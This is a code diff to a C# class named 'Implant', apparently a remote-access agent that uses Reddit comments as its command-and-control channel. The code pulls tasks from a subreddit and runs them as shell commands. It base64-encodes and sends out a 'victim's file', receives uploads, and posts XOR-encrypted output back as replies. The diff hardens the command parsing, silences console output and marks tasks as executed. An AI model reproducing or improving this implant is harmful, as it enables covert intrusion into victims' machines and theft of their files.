@@ -13,7 +13,7 @@ using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using static System.Net.Mime.MediaTypeNames;
-
+using System.Runtime.InteropServices;
 
 public class Implant
 {
@@ -89,14 +89,13 @@ public class Implant
         {
             string output = "";
             string command = readTask(username, password, subreddit, listenerID, xorkey);
-            Console.WriteLine(command);
-            if (command.Substring(0, 8) == "download") //base64 the victim's file
+            if (command.Length > 8 && command.Substring(0, 8) == "download") //base64 the victim's file
             {
                 string filename = command.Remove(0, 9);
                 output = EncodeFileToBase64(filename);
                 sendOutput(command, output, username, password, subreddit, listenerID, xorkey);
             }
-            else if (command.Substring(0, 6) == "upload")
+            else if (command.Length > 6 && command.Substring(0, 6) == "upload")
             {
                 string[] words = command.Split(' ');
 
@@ -142,7 +141,7 @@ public class Implant
         // Read the output stream first and then wait.
         string output = p.StandardOutput.ReadToEnd();
         p.WaitForExit();
-        Console.WriteLine(output);
+        //Console.WriteLine(output);
 
         return output;
     }
@@ -169,7 +168,9 @@ public class Implant
                             comment.Reply("out: b'" + ciphertext + "'"); //out: b'base64' which is recognized by python pattern
                             System.Threading.Thread.Sleep(3000);
                             //add (executed) to the reply to tell the implant to not execute it twice, this is already done in teamserver
-                            //comment.EditText("executed");
+                            String comment_body = comment.Body;
+                            String edited_comment_body = comment_body.Replace("in", "executed");
+                            comment.EditText(edited_comment_body);
                         }
                     }
                 }
